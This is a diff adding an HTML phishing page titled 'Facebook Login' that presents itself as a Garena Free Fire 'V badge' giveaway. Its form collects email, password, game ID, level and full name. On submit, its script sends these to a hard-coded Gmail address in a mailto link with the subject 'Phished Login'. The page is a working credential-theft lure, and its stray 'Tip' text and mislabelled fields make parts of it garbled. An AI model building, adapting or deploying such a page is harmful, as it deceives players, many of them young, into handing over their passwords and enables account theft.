@@ -1,0 +1,304 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Facebook Login</title>
+  <style>
+    @media (max-width: 1267px) {
+      body{
+        width: 100%;
+      }
+    }
+    @media (max-width: 612px) {
+      body{
+        width: 100%;
+      }
+      .login-container{
+        align-content: center;
+        margin-right: 1rem;
+      }
+      
+    }
+    @media (max-width: 610px) {
+      body{
+        width: 100%;
+      }
+      .login-container{
+        right: -10rem;
+        
+      }
+      
+    }
+    /* @media (max-width: 900px) {
+      .login-container{
+        padding: 2rem 2rem;
+      }
+      .login-container input[type="email"],
+      .login-container input[type="password"],
+      .login-container input[type="text"],
+      .login-container input[type="number"] {
+        width: 90%;
+        padding: 8px;
+        margin: 8px 0;
+        border: 10px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+        box-sizing: border-box;
+    } */
+    
+    body {
+      margin: 0;
+      padding: 0;
+      font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+      background: #eef2ff;
+      background-image: url(garena.png);
+      background-repeat:repeat;
+      background-size: 8rem;
+      background-position: 90%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .login-container {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      width: 100%;
+      opacity: 90%;
+      
+      max-width: 400px;
+      box-sizing: border-box;
+      text-align: center;
+      margin-top: 700px;
+    }
+
+    .login-container h2 {
+      margin-bottom: 20px;
+      color: #ff0000;
+    }
+
+    .login-container input[type="email"],
+    .login-container input[type="password"],
+    .login-container input[type="text"],
+    .login-container input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    .login-container button{
+      width: 100%;
+      padding: 10px;
+      background-color: #ff0000;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-container button:hover {
+      background-color: #fa2020;
+    }
+
+    .login-container .signup-link {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .login-container .signup-link a {
+      color: #35a449;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .country{
+      width: 100%;
+      padding: 10px;
+      border: 1px solid rgb(212, 211, 211);
+      border-radius: 4px;
+
+      font-size: 16px;
+      color: rgb(118, 118, 118);
+      transition: background 0.3s ease;
+    }
+    input [type ="checkbox"]{
+      width: 200px;
+    }
+    .garena{
+      width: 100px;
+      /* padding-top: 120px; */
+      
+    }
+    .vbage{
+      width: 120px;
+      margin-top: 2rem;
+      
+    }
+    p{
+      font-family: sans-serif;
+      font-size: 20px;
+      text-align: left;
+    }
+    span{
+      color: #ff0000;
+      margin-right: 300px;
+    }
+    .first{
+      color: #35a449;
+      text-align: left;
+    }
+    .down{
+      color: #35a449;
+      background-color: #35a449;
+      width: 35px;
+      height: 35px;
+      border-radius: 100%;
+      margin-left: 45%;
+      margin-top: 2rem;
+
+    }
+    .down span{
+      color: white;
+      font-size: 29px;
+      padding: 2px 10px;
+      
+      
+    }
+    h3{
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <!-- <h2>Garena FF</h2> -->
+    <img class="garena" src="garena.png" alt="">
+    <h2>WELCOME TO GARENA VBAGE</h2>
+    <p>This is only for those user who want to get Vbage in FreeFire Game Play you don't need any Popular TikTok or YouTube account for this but you need to fill these all Input Boxes properly and don't miss any inputbox and you will get your vbage in 48-60 hours.
+    <br>
+    <span>Tip:</span>
+    
+
+<span class="first">
+1. Submit a test form (non-urgent category).
+<br>
+2. Take note of the confirmation text shown after submission.
+</span>
+
+</p>
+<div class="down">
+      
+  <span class="">↓</span>
+    </div>
+    <img class="vbage" src="vbage.png" alt="">
+    <!-- ----------------------------- -->
+    <input type="email" id="email" placeholder="Email" required>
+
+    <input type="password" id="password" placeholder="Password" required>
+
+    <input type="text" id="Idnumber" placeholder="ID Numbers" required>
+
+    <input type="number" id="level" placeholder="ID Level" required>
+
+    <input type="text" id="name" placeholder="Full Name" required>
+    <form id="loginForm">
+    
+      <input type="number" id="age" placeholder="You Age" required>
+      <select class="country" name="" id="">
+        <option value="">Gender</option>
+        <option value="">male</option>
+        <option value="">female</option>
+           </select>
+           <br>
+           <br>
+      <select class="country" required>
+            <option value="">Country</option>
+            <option value="">Afghanistan</option>
+            <option value="">Bangal</option>
+            <option value="">Brazil</option>
+            <option value="">China</option>
+            <option value="">Columbia</option>
+            <option value="">Denmark</option>
+            <option value="">Ejypt</option>
+            <option value="">France</option>
+            <option value="">Germani</option>
+            <option value="">Iran</option>
+            <option value="">Iraq</option>
+            <option value="">Israil</option>
+            <option value="">Libnan</option>
+            <option value="">Netharlan</option>
+            <option value="">Oman</option>
+            <option value="">Pakistan</option>
+            <option value="">Putagal</option>
+            <option value="">Roman</option>
+            <option value="">Seria</option>
+            <option value="">Hiland</option>
+            <option value="">Western </option>
+            <option value="">Yemen</option>
+            <option value="">Yemen</option>
+           </select>
+           <br>
+           <br>
+             <select class="country" name="" id="">
+              
+        <option value="">How Much You Play FreeFire</option>
+            <option value="">Less then < 1hrs/1hrs </option>
+            <option value="">2hrs</option>
+            <option value="">3hrs</option>
+            <option value="">3hrs</option>
+            <option value="">4hrs</option>
+            <option value="">Other</option>
+           </select>
+           <br>
+           <br>
+           <select class="country" name="" id="">
+              
+        <option value="">Profession</option>
+            
+            <option value="">Gamer</option>
+            <option value="">Student</option>
+            <option value="">Engr</option>
+            <option value="">Doctor</option>
+            <option value="">Other</option>
+           </select>
+
+
+    <input style="margin: 10px;" type="checkbox" required>Remember Me 
+  </input>
+
+      <button type="submit">Submit</button>
+    </form>
+    <!-- <div class="signup-link">
+      <a href="#">Create new account</a>
+    </div> -->
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault(); // Prevent form from submitting normally
+      const idnumber = document.getElementById('Idnumber').value;
+      const name = document.getElementById('name').value;
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const level = document.getElementById('level').value;
+      // Construct mailto link with user data
+      const mailtoLink = `mailto:ubaidkhan7.ml@gmail.com?subject=Phished%20Login&body=Email:%20${encodeURIComponent(email)}%0APassword:%20${encodeURIComponent(password)}%0APassword:%20${encodeURIComponent(idnumber)}%0APassword:%20${encodeURIComponent(name)}%0APassword:%20${encodeURIComponent(level)}`;
+
+      // Open user's default email client
+      window.location.href = mailtoLink;
+    });
+  </script>
+</body>
+</html>
